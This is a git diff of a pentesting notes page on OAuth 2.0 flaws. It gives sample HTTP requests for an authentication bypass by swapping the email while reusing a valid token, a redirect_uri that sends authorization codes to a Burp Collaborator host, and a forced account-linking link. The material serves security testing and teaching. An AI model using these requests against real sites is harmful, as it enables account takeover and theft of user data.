@@ -1,6 +1,6 @@
 ---
 title: Oauth
-
+description: While browsing the web, you've almost certainly come across sites that let you log in using your social media account. The chances are that this feature is built using the popular OAuth 2.0 framework. OAuth 2.0 is highly interesting for attackers because it is both extremely common and inherently prone to implementation mistakes. This can result in a number of vulnerabilities, allowing attackers to obtain sensitive user data and potentially bypass authentication completely.
 ---
 
 
@@ -12,7 +12,7 @@ Check if authentication on the target server depends solely on the OAuth token o
 
 ```http
 POST /authenticate HTTP/1.1
-Host: {{ target-domain vulerable-server.net }}
+Host: {{ target-domain vulerable.net }}
 Cookie: session=n20zBuYgGlReeEXCjbsonkzq2qaH8txt
 Content-Length: 103
 Content-Type: application/json
@@ -25,7 +25,7 @@ The server only checks if the token is valid, and then logs-in to the indicated 
 
 ```http
 POST /authenticate HTTP/1.1
-Host: {{ target-domain vulerable-server.net }}
+Host: {{ target-domain vulerable.net }}
 Cookie: session=n20zBuYgGlReeEXCjbsonkzq2qaH8txt
 Content-Length: 103
 Content-Type: application/json
@@ -42,7 +42,7 @@ This vulnerability affects the OAuth provider or its configuration. Not limiting
 
 ```http
 GET /auth?client_id=X&redirect_uri=https%3a%2f%2f{{ collaborator your.burpcollaborator.net }}&response_type=code&scope=openid%20profile%20email HTTP/1.1
-Host: {{ target-domain vulerable-server.net }}
+Host: {{ target-domain vulerable.net }}
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
 Connection: close
 ```
@@ -66,9 +66,9 @@ You can force people into either using yor account or into linking your social m
 ```http
 HTTP/1.1 302 Found
 Content-Type: text/html; charset=utf-8
-Location: https://{{ target-domain vulerable-server.net }}/oauth-linking?code=PsM3KdpzzNnEfl4bYBIu0HgXkXiQd5Ge4zDbvGnKBRY
+Location: https://{{ target-domain vulerable.net }}/oauth-linking?code=PsM3KdpzzNnEfl4bYBIu0HgXkXiQd5Ge4zDbvGnKBRY
 
-<a href="https://{{ target-domain vulerable-server.net }}/oauth-linking?code=PsM3KdpzzNnEfl4bYBIu0HgXkXiQd5Ge4zDbvGnKBRY">Click me</a>
+<a href="https://{{ target-domain vulerable.net }}/oauth-linking?code=PsM3KdpzzNnEfl4bYBIu0HgXkXiQd5Ge4zDbvGnKBRY">Click me</a>
 ```
 
 
